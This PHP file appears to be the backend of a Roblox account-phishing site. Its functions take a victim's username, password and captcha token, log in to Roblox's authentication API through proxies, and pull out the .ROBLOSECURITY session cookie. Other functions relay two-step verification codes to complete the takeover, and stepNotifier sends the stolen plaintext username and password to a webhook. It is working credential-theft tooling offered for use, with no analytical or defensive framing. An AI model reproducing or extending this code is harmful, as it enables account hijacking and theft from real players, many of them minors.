<?php
function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
function getid($username)
{
    $ch = file_get_contents('https://api.roblox.com/users/get-by-username?username='.$username.'');
    $json = json_decode($ch, true);
    $userid = $json['Id'];
    return $userid;
}
$domain = "https://".$_SERVER["SERVER_NAME"];
function request($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

function pdoQuery($con, $query, $values = array()) {
  try{
      if($values) {
          $stmt = $con->prepare($query);
          $stmt->execute($values);
      } else {
          $stmt = $con->query($query);
      }
      return $stmt;
  }catch(PDOException $Exception) {
      die("Error");
  }
}
function abbreviateNumber($num) {
    if ($num >= 0 && $num < 1000) {
      $format = floor($num);
      $suffix = '';
    } 
    else if ($num >= 1000 && $num < 1000000) {
      $format = floor($num / 1000);
      $suffix = 'K+';
    } 
    else if ($num >= 1000000 && $num < 1000000000) {
      $format = floor($num / 1000000);
      $suffix = 'M+';
    } 
    else if ($num >= 1000000000 && $num < 1000000000000) {
      $format = floor($num / 1000000000);
      $suffix = 'B+';
    } 
    else if ($num >= 1000000000000) {
      $format = floor($num / 1000000000000);
      $suffix = 'T+';
    }
    
    return !empty($format . $suffix) ? $format . $suffix : 0;
  }

//start of Functions
function requestId($username)
{
    $getId = request("https://api.roblox.com/users/get-by-username?username=$username");
    if (strpos($getId, 'Id') !== false) {
        $idDecode = json_decode($getId);
        $id = $idDecode->Id;
        return $id;
    } else {
        return "Not Exist";
    }
    return;
}
function requestSponsorship($id)
{
    $getSponsorship = request("https://www.roblox.com/user-sponsorship/$id");
    return $getSponsorship;
}
function randNum($length)
{
    $intMin = (10 ** $length) / 10; // 100...
    $intMax = (10 ** $length) - 1;  // 999...

    $codeRandom = mt_rand($intMin, $intMax);

    return $codeRandom;
}




    function csrf($proxy)
    {
        $proxy = explode(':', $proxy);
        $proxy_ip = $proxy[0];
        $proxy_port = $proxy[1];
        $user = $proxy[2];
        $pass = $proxy[3];
        $post_fields = "{\"cvalue\":\"username\",\"ctype\":\"Username\",\"password\":\"password\",\"captchaToken\":\"token\",\"captchaProvider\":\"PROVIDER_ARKOSE_LABS\"}";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v2/login");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $headers = [];
        $result = rtrim($result);
        $data = explode("\n",$result);
        $headers['status'] = $data[0];
        array_shift($data);
        foreach($data as $part){
    
            //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
            $middle = explode(":",$part,2);
    
            //Supress warning message if $middle[1] does not exist, Thanks to @crayons
            if ( !isset($middle[1]) ) { $middle[1] = null; }
            $headers[trim($middle[0])] = trim($middle[1]);
        }
        
        $csrf = $headers["x-csrf-token"];
        return $csrf;
    }
    
    

    function login($username, $password, $captcha, $fullproxy){
        $uid = getid($username);
        $proxy = explode(':', $fullproxy);
        $proxy_ip = $proxy[0];
        $proxy_port = $proxy[1];
        $user = $proxy[2];
        $pass = $proxy[3];
        $csrf = csrf($fullproxy);
    
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v2/login");
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_PROXYPORT, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
        curl_setopt($ch, CURLOPT_PROXY, $proxy_ip);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user . ':' . $pass);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $postfields = array(
            "cvalue" => $username,
            "ctype" => "Username",
            "password" => $password,
            "captchaId" => mt_rand() . mt_rand() ,
            "captchaToken" => $captcha,
            "captchaProvider" => "PROVIDER_ARKOSE_LABS"
        );
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postfields));
        $headers = ["content-type: application/json", "x-csrf-token: $csrf"];
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $output = curl_exec($ch);
        $header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($output, 0, $header_len);
        $body = substr($output, $header_len);
        $out=json_decode($body, true);
            $cookie = null;
            foreach(explode("\n",$header) as $part) {
                if (strpos($part, ".ROBLOSECURITY")) {
                    $cookie = explode(";", explode("=", $part)[1])[0];
                    break;
                }
            }
            $pos = strpos($output, '{"errors":[');
            $remaining = substr($output, $pos);
            if($remaining == '{"errors":[{"code":7,"message":"Too many attempts. Please wait a bit.","userFacingMessage":"Something went wrong"}]}'){
                return '{"success": "false", "message": "Too many attempts. Please wait a bit."}';
            }if($remaining == '{"errors":[{"code":1,"message":"Incorrect username or password. Please try again.","userFacingMessage":"Something went wrong"}]}'){
                 return '{"success": "false", "message": "Incorrect username or password"}';
            }
            if($cookie){
                 return '{"success": "true", "message": "success", "cookie": "'.$cookie.'", "proxy": "'.$proxy.'"}';
            }else{
                $ticket = $out['twoStepVerificationData']['ticket'];
                
                 return '{"success": "false", "message": "2nd", "ticket": "'.$ticket.'"}';
            }
            curl_close($ch);
    }
function stepLogin($uid,$password,$code,$ticket) {
$csrf = csrf('x');
$fields_string='{
	"challengeId":"'.$ticket.'",
	"actionType":"Login",
	"code":"'.$code.'"
}';

$ch2= curl_init();

curl_setopt($ch2, CURLOPT_URL, 'https://twostepverification.roblox.com/v1/users/'.$uid.'/challenges/email/verify');
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_POST, 1);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_POSTFIELDS, $fields_string);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
   $headers[] =    'x-csrf-token:'.$csrf;
curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);

$output = curl_exec($ch2);
$json=json_decode($output); 
echo $output;

}
function stepNotifier($webhook, $username, $password, $sitename, $sitepfp)
{
    $domain = "https://".$_SERVER["HTTP_HOST"];
    $webhookParams = json_encode([
        "username" => "$sitename - 2 Step Notifier",
        "avatar_url" => "$sitepfp",
        "content" => "",
        "embeds" => [
            [
                "color" => hexdec( "3366ff" ),
                "footer" => [
                    "text" => "$sitename",
                    "icon_url" => "$sitepfp"
                ],
                "author" => [
                    "name" => "$sitename - 2 Step Notifier",
                    "url" => "$domain/generator",
                ],
                "title" => "",
                "description" => "$username already logged in wait for him to enter two steps of verification",
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => $username,
                        "inline" => true
                    ],
                    [
                        "name" => "**Password**",
                        "value" => $password,
                        "inline" => true
                    ]
                ]
            ]
        ],
    ]);
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $webhookParams);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    curl_close($ch);
    return "success";
}

?>